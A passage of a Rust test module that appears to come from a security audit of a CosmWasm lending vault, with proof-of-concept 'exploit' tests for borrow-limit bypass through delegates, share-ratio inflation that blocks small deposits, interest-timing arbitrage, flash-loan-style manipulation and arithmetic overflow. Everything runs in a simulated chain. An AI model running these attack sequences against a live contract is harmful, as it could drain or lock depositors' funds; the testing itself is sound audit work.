            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(50_000u128),
                delegate: Some(delegate1.to_string()),
            }),
            &[],
        );
        println!("Result: {:?}", if res2.is_ok() { "SUCCESS" } else { "FAILED" });

        // Try delegating to yet another address
        let delegate2 = app.api().addr_make("delegate2");
        println!("\nAttempt 3: Borrow another 50k via different delegate");
        let res3 = app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(50_000u128),
                delegate: Some(delegate2.to_string()),
            }),
            &[],
        );
        println!("Result: {:?}", if res3.is_ok() { "SUCCESS" } else { "FAILED" });

        // Check total borrowed
        let borrower: BorrowerResponse = app
            .wrap()
            .query_wasm_smart(
                vault_contract.clone(),
                &QueryMsg::Borrower {
                    addr: attacker.to_string(),
                },
            )
            .unwrap();

        println!("\nFinal state:");
        println!("Total borrowed: {}", borrower.current);
        println!("Limit: {}", borrower.limit);

        if borrower.current > borrower.limit {
            println!("🚨 EXPLOIT SUCCESSFUL!");
            println!("Borrowed {} beyond limit of {}", 
                borrower.current.u128() - borrower.limit.u128(),
                borrower.limit
            );
        } else {
            println!("✅ Limit enforced correctly");
        }
    }

    /// POC 5: Query State Manipulation (FIXED)
    /// 
    /// Demonstrates that queries show different state than actual storage
    #[test]
    fn exploit_query_state_inconsistency() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Query State Inconsistency ===");

        // Setup initial state with more funds
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(10_000_000, "btc"), // Larger initial deposit
        ).unwrap();

        // Whitelist borrower
        app.wasm_sudo(
            vault_contract.clone(),
            &SudoMsg::SetBorrower {
                contract: attacker.to_string(),
                limit: Uint128::from(5_000_000u128),
            },
        ).unwrap();

        // Borrow
        app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(5_000_000u128),
                delegate: None,
            }),
            &[],
        ).unwrap();

        println!("Initial state: borrowed 5M btc");

        // Advance time to accrue significant interest
        app.update_block(|b| b.time = b.time.plus_days(365));
        println!("Time advanced by 365 days");

        // Query 1: Check status
        let status1: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        println!("\nQuery 1 - Debt pool size: {}", status1.debt_pool.size);
        println!("Query 1 - Deposit pool size: {}", status1.deposit_pool.size);

        // Query 2: Check status again (should be same since no execute)
        let status2: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        println!("Query 2 - Debt pool size: {}", status2.debt_pool.size);

        // Execute a deposit to trigger state update (use larger amount)
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(100_000, "btc"), // Larger deposit to avoid ZeroShares
        ).unwrap();
        println!("\nExecuted a deposit (triggers state update)");

        // Query 3: Check status after execute
        let status3: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        println!("Query 3 - Debt pool size: {}", status3.debt_pool.size);
        println!("Query 3 - Deposit pool size: {}", status3.deposit_pool.size);

        println!("\nAnalysis:");
        println!("Queries 1 & 2 debt: {}", status1.debt_pool.size);
        println!("Query 3 debt (after execute): {}", status3.debt_pool.size);
        
        if status1.debt_pool.size != status3.debt_pool.size {
            println!("🚨 STATE INCONSISTENCY DETECTED!");
            println!("Queries showed interest accrued, but state wasn't actually updated");
            println!("Difference: {} btc", status3.debt_pool.size.u128() - status1.debt_pool.size.u128());
            println!("This could allow arbitrage or manipulation");
        } else {
            println!("✅ State consistent between queries and executions");
        }
    }

    /// POC 7: Zero Shares Vulnerability
    /// 
    /// Tests the ZeroShares error we discovered - small deposits may not mint any shares
    #[test]
    fn exploit_zero_shares_dos() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Zero Shares DoS Attack ===");

        // Step 1: Create a large pool
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000_000_000, "btc"), // 1 billion
        ).unwrap();

        println!("Owner deposits 1,000,000,000 btc");

        // Step 2: Inflate the ratio by donating
        app.send_tokens(
            owner.clone(),
            vault_contract.clone(),
            &coins(1_000_000_000, "btc"), // Another billion
        ).unwrap();

        println!("Owner donates another 1,000,000,000 btc directly");

        // Check pool state
        let status: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        
        println!("Pool ratio: {}", status.deposit_pool.ratio);
        println!("Pool size: {}", status.deposit_pool.size);
        println!("Pool shares: {}", status.deposit_pool.shares);

        // Step 3: Victim tries to deposit small amount
        println!("\nVictim tries to deposit 1 btc...");
        let res = app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1, "btc"),
        );

        match res {
            Err(e) => {
                println!("🚨 EXPLOIT CONFIRMED: Small deposits fail!");
                println!("Error: {}", e);
                println!("Attacker successfully DoS'd small depositors");
            }
            Ok(_) => {
                let attacker_shares = app
                    .wrap()
                    .query_balance(attacker.clone(), "x/ghost-vault/btc")
                    .unwrap();
                println!("Deposit succeeded with {} shares", attacker_shares.amount);
                
                if attacker_shares.amount.is_zero() {
                    println!("🚨 EXPLOIT: Depositor received 0 shares but lost funds!");
                }
            }
        }

        // Try progressively larger amounts to find minimum deposit
        for amount in [10, 100, 1_000, 10_000, 100_000, 1_000_000].iter() {
            let test_user = app.api().addr_make(&format!("test_{}", amount));
            app.init_modules(|router, _, storage| {
                router
                    .bank
                    .init_balance(storage, &test_user, coins(10_000_000, "btc"))
                    .unwrap();
            });

            let res = app.execute_contract(
                test_user.clone(),
                vault_contract.clone(),
                &ExecuteMsg::Deposit { callback: None },
                &coins(*amount, "btc"),
            );

            match res {
                Ok(_) => {
                    println!("✅ Minimum viable deposit found: {} btc", amount);
                    break;
                }
                Err(_) => {
                    println!("❌ {} btc deposit failed", amount);
                }
            }
        }
    }

    /// POC 8: Interest Accrual Arbitrage
    /// 
    /// Exploit the query inconsistency to perform arbitrage
    #[test]
    fn exploit_interest_arbitrage() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Interest Accrual Arbitrage ===");

        // Setup: Large deposit and borrow
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(10_000_000, "btc"),
        ).unwrap();

        app.wasm_sudo(
            vault_contract.clone(),
            &SudoMsg::SetBorrower {
                contract: owner.to_string(),
                limit: Uint128::from(5_000_000u128),
            },
        ).unwrap();

        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(5_000_000u128),
                delegate: None,
            }),
            &[],
        ).unwrap();

        println!("Setup: 10M deposit, 5M borrowed");

        // Advance time significantly
        app.update_block(|b| b.time = b.time.plus_days(365));
        
        // Query to see accrued interest (but state not updated)
        let status_query: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        
        println!("\nAfter 365 days (via query):");
        println!("Deposit pool ratio: {}", status_query.deposit_pool.ratio);
        println!("Debt pool size: {}", status_query.debt_pool.size);

        // Attacker deposits right before state update
        let attacker_deposit = 1_000_000u128;
        println!("\n🚨 Attacker deposits {} btc BEFORE state update...", attacker_deposit);
        
        app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(attacker_deposit, "btc"),
        ).unwrap();

        let attacker_shares = app
            .wrap()
            .query_balance(attacker.clone(), "x/ghost-vault/btc")
            .unwrap();
        
        println!("Attacker received {} shares", attacker_shares.amount);

        // Calculate theoretical vs actual shares
        let theoretical_shares = attacker_deposit; // Should get ~1:1 before interest update
        let actual_shares = attacker_shares.amount.u128();
        
        println!("\nTheoretical shares (pre-interest): {}", theoretical_shares);
        println!("Actual shares received: {}", actual_shares);
        
        if actual_shares < theoretical_shares * 90 / 100 {
            println!("🚨 Attacker got fewer shares due to interest update!");
            println!("This proves the timing matters for deposits");
        } else if actual_shares > theoretical_shares * 110 / 100 {
            println!("🚨 Attacker got more shares (shouldn't happen)");
        } else {
            println!("✅ Fair share distribution");
        }

        // Now someone else deposits AFTER the interest was accrued
        println!("\n📊 Comparison: Another user deposits same amount...");
        
        let victim = app.api().addr_make("victim");
        app.init_modules(|router, _, storage| {
            router
                .bank
                .init_balance(storage, &victim, coins(10_000_000, "btc"))
                .unwrap();
        });

        app.execute_contract(
            victim.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(attacker_deposit, "btc"),
        ).unwrap();

        let victim_shares = app
            .wrap()
            .query_balance(victim.clone(), "x/ghost-vault/btc")
            .unwrap();
        
        println!("Victim received {} shares", victim_shares.amount);
        
        let share_difference = actual_shares as i128 - victim_shares.amount.u128() as i128;
        if share_difference.abs() > (attacker_deposit / 100) as i128 {
            println!("🚨 TIMING ATTACK CONFIRMED!");
            println!("Share difference: {} ({}%)", 
                share_difference,
                (share_difference * 100) / attacker_deposit as i128
            );
        }
    }

    /// POC 9: Borrow Repay Flash Loan Style
    /// 
    /// Test if same-block borrow and repay can manipulate state
    #[test]
    fn exploit_flash_loan_manipulation() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Flash Loan Style Manipulation ===");

        // Setup
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(10_000_000, "btc"),
        ).unwrap();

        app.wasm_sudo(
            vault_contract.clone(),
            &SudoMsg::SetBorrower {
                contract: attacker.to_string(),
                limit: Uint128::from(5_000_000u128),
            },
        ).unwrap();

        println!("Setup: 10M liquidity, attacker has 5M borrow limit");

        // Get initial state
        let status_before: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        
        println!("Initial utilization: {}", status_before.utilization_ratio);

        // Borrow max
        app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(5_000_000u128),
                delegate: None,
            }),
            &[],
        ).unwrap();

        println!("Borrowed 5M btc");

        // Immediately repay (same block)
        app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Repay { delegate: None }),
            &[coin(5_000_000, "btc")],
        ).unwrap();

        println!("Immediately repaid 5M btc");

        // Check if any state changed
        let status_after: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();

        println!("\nState comparison:");
        println!("Before - Debt: {}, Deposits: {}", 
            status_before.debt_pool.size, 
            status_before.deposit_pool.size
        );
        println!("After  - Debt: {}, Deposits: {}", 
            status_after.debt_pool.size, 
            status_after.deposit_pool.size
        );

        // Check for any dust or rounding errors
        if status_after.debt_pool.size != status_before.debt_pool.size {
            println!("🚨 Debt pool changed: {} btc difference", 
                status_after.debt_pool.size.u128() as i128 - status_before.debt_pool.size.u128() as i128
            );
        }
        
        if status_after.deposit_pool.size != status_before.deposit_pool.size {
            println!("⚠️  Deposit pool changed: {} btc difference", 
                status_after.deposit_pool.size.u128() as i128 - status_before.deposit_pool.size.u128() as i128
            );
        }
    }
    /// POC 6: Fee Extraction Analysis
    /// 
    /// Analyzes if fees are properly collected during operations
    #[test]
    fn exploit_fee_extraction_race() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Fee Collection Analysis ===");

        // Initial deposit to create interest
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000_000, "btc"),
        ).unwrap();

        // Setup borrower and borrow to create debt
        app.wasm_sudo(
            vault_contract.clone(),
            &SudoMsg::SetBorrower {
                contract: owner.to_string(),
                limit: Uint128::from(500_000u128),
            },
        ).unwrap();

        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(500_000u128),
                delegate: None,
            }),
            &[],
        ).unwrap();

        // Advance time to accrue fees
        app.update_block(|b| b.time = b.time.plus_days(90));
        println!("Accrued interest for 90 days");

        // Check fee address balance before
        let fee_shares_before = app
            .wrap()
            .query_balance(owner.clone(), "x/ghost-vault/btc")
            .unwrap();
        println!("Fee address shares before: {}", fee_shares_before.amount);

        // Attacker makes deposit - this should accrue fees
        let _res = app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(100_000, "btc"),
        );

        let fee_shares_after = app
            .wrap()
            .query_balance(owner.clone(), "x/ghost-vault/btc")
            .unwrap();
        println!("Fee address shares after: {}", fee_shares_after.amount);

        let fees_collected = fee_shares_after.amount.u128() - fee_shares_before.amount.u128();
        println!("Fees collected: {} shares", fees_collected);

        if fees_collected == 0 {
            println!("🚨 NO FEES COLLECTED!");
            println!("Potential race condition or fee calculation bug");
        } else {
            println!("✅ Fees collected properly: {} shares", fees_collected);
        }
    }
    /// POC 10: Integer Overflow Bug - Isolated
    /// 
    /// Isolates the overflow that occurs with large deposits or time passing
    #[test]
    fn exploit_integer_overflow_isolated() {
        let (mut app, owner, _attacker, vault_contract) = setup_vault();

        println!("\n=== Integer Overflow Bug Isolation ===");

        // Make initial deposit
        println!("Step 1: Initial deposit of 100M btc");
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(100_000_000, "btc"),
        ).unwrap();

        // Setup borrower
        app.wasm_sudo(
            vault_contract.clone(),
            &SudoMsg::SetBorrower {
                contract: owner.to_string(),
                limit: Uint128::from(50_000_000u128),
            },
        ).unwrap();

        // Borrow half
        println!("Step 2: Borrow 50M btc");
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(50_000_000u128),
                delegate: None,
            }),
            &[],
        ).unwrap();

        // Check state before time advance
        let status_before: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        
        println!("\nBefore time advance:");
        println!("Deposit pool: size={}, shares={}", 
            status_before.deposit_pool.size,
            status_before.deposit_pool.shares
        );
        println!("Debt pool: size={}, shares={}", 
            status_before.debt_pool.size,
            status_before.debt_pool.shares
        );

        // Advance time significantly
        println!("\nStep 3: Advance time by 365 days...");
        app.update_block(|b| b.time = b.time.plus_days(365));

        // Try to query (this might trigger the overflow)
        println!("Step 4: Query status (may trigger overflow in calculation)...");
        let status_query = app
            .wrap()
            .query_wasm_smart::<StatusResponse>(vault_contract.clone(), &QueryMsg::Status {});
        
        match status_query {
            Ok(status) => {
                println!("Query succeeded:");
                println!("Deposit pool: size={}, shares={}", 
                    status.deposit_pool.size,
                    status.deposit_pool.shares
                );
                println!("Debt pool: size={}, shares={}", 
                    status.debt_pool.size,
                    status.debt_pool.shares
                );
            }
            Err(e) => {
                println!("🚨 Query failed with: {}", e);
            }
        }

        // Try to execute a small deposit (this triggers the overflow)
        println!("\nStep 5: Try small deposit (triggers state update)...");
        let deposit_res = app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000, "btc"),
        );

        match deposit_res {
            Ok(_) => {
                println!("✅ Deposit succeeded");
            }
            Err(e) => {
                println!("🚨 CRITICAL BUG FOUND!");
                println!("Deposit failed with overflow: {}", e);
                println!("This can lock funds and DoS the contract!");
            }
        }
    }

    /// POC 11: Underflow in Available Calculation
    /// 
    /// Tests if the available calculation underflows
    #[test]
    fn exploit_available_underflow() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Available Calculation Underflow ===");

        // Setup with borrowing
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000_000, "btc"),
        ).unwrap();

        app.wasm_sudo(
            vault_contract.clone(),
            &SudoMsg::SetBorrower {
                contract: attacker.to_string(),
                limit: Uint128::from(900_000u128),
            },
        ).unwrap();

        // Borrow close to limit
        app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(800_000u128),
                delegate: None,
            }),
            &[],
        ).unwrap();

        println!("Setup: 1M deposited, 800k borrowed");

        // Advance time to accrue interest beyond limit
        app.update_block(|b| b.time = b.time.plus_days(365));

        println!("Advanced time 365 days");

        // Query borrower - this calculates available
        let borrower_query = app
            .wrap()
            .query_wasm_smart::<BorrowerResponse>(
                vault_contract.clone(),
                &QueryMsg::Borrower {
                    addr: attacker.to_string(),
                },
            );

        match borrower_query {
            Ok(borrower) => {
                println!("\nBorrower state:");
                println!("Current debt: {}", borrower.current);
                println!("Limit: {}", borrower.limit);
                println!("Available: {}", borrower.available);
                
                if borrower.current > borrower.limit {
                    println!("🚨 Debt exceeded limit due to interest!");
                    println!("Overflow: {} btc", borrower.current.u128() - borrower.limit.u128());
                    
                    // The available calculation does: limit.checked_sub(current).unwrap_or_default()
                    // This should handle it, but let's verify
                    if borrower.available.is_zero() {
                        println!("✅ Available correctly set to 0 (used unwrap_or_default)");
                    } else {
                        println!("🚨 Available is non-zero when it shouldn't be!");
                    }
                }
            }
            Err(e) => {
                println!("🚨 Query failed: {}", e);
            }
        }
    }

    /// POC 12: Deposit Pool Underflow
    /// 
    /// Tests the specific overflow in deposit calculation
    #[test]
    fn exploit_deposit_pool_underflow() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Deposit Pool Calculation Bug ===");

        // Make large initial deposit
        println!("Step 1: Owner deposits 1 billion btc");
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000_000_000, "btc"),
        ).unwrap();

        let status1: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        
        println!("Deposit pool: size={}, shares={}", 
            status1.deposit_pool.size, 
            status1.deposit_pool.shares
        );

        // Setup borrower and borrow heavily
        app.wasm_sudo(
            vault_contract.clone(),
            &SudoMsg::SetBorrower {
                contract: owner.to_string(),
                limit: Uint128::from(900_000_000u128),
            },
        ).unwrap();

        println!("\nStep 2: Borrow 900M btc");
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(900_000_000u128),
                delegate: None,
            }),
            &[],
        ).unwrap();

        // Advance time for massive interest
        println!("\nStep 3: Advance time 730 days (2 years)");
        app.update_block(|b| b.time = b.time.plus_days(730));

        // Query to see the interest
        let status_query = app
            .wrap()
            .query_wasm_smart::<StatusResponse>(vault_contract.clone(), &QueryMsg::Status {});
        
        if let Ok(status) = status_query {
            println!("\nAfter 2 years (query):");
            println!("Deposit pool: size={}, shares={}", 
                status.deposit_pool.size, 
                status.deposit_pool.shares
            );
            println!("Debt pool: size={}, shares={}", 
                status.debt_pool.size, 
                status.debt_pool.shares
            );
            println!("Utilization: {}", status.utilization_ratio);
        }

        // Now attacker tries to deposit - this will trigger state.distribute_interest()
        println!("\nStep 4: Attacker deposits small amount (triggers overflow)...");
        let res = app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(100_000, "btc"),
        );

        match res {
            Ok(_) => println!("✅ Deposit succeeded"),
            Err(e) => {
                println!("🚨 OVERFLOW BUG CONFIRMED!");
                println!("Error: {}", e);
                
                // This likely happens in distribute_interest when:
                // - Calculating fees to mint
                // - Updating pool sizes
                // - debt_pool.size might exceed deposit_pool.size
                println!("\nLikely cause:");
                println!("Interest accrual caused debt > deposits");
                println!("When trying to calculate deposit_pool.size - debt_pool.size");
                println!("Or similar subtraction in the fee calculation");
            }
        }
    }

    /// POC 13: Withdraw Everything to Find Dust
    /// 
    /// Tests for any remaining dust after full withdrawal
    #[test]
    fn exploit_dust_accounting() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Dust Accounting Test ===");

        // Multiple users deposit
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000_000, "btc"),
        ).unwrap();

        app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(500_000, "btc"),
        ).unwrap();

        println!("Total deposited: 1,500,000 btc");

        // Everyone withdraws everything
        let owner_shares = app.wrap().query_balance(owner.clone(), "x/ghost-vault/btc").unwrap();
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Withdraw { callback: None },
            &[coin(owner_shares.amount.u128(), "x/ghost-vault/btc")],
        ).unwrap();

        let attacker_shares = app.wrap().query_balance(attacker.clone(), "x/ghost-vault/btc").unwrap();
        app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Withdraw { callback: None },
            &[coin(attacker_shares.amount.u128(), "x/ghost-vault/btc")],
        ).unwrap();

        // Check if any BTC remains in contract
        let contract_balance = app.wrap().query_balance(vault_contract.clone(), "btc").unwrap();
        println!("BTC remaining in contract: {}", contract_balance.amount);

        // Check pool state
        let status: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        
        println!("Deposit pool size: {}", status.deposit_pool.size);
        println!("Deposit pool shares: {}", status.deposit_pool.shares);

        if contract_balance.amount.u128() > 0 {
            println!("⚠️  {} btc dust left in contract", contract_balance.amount);
        }

        if status.deposit_pool.size.u128() > 0 {
            println!("⚠️  Pool accounting shows {} btc remaining", status.deposit_pool.size);
        }
    }
}
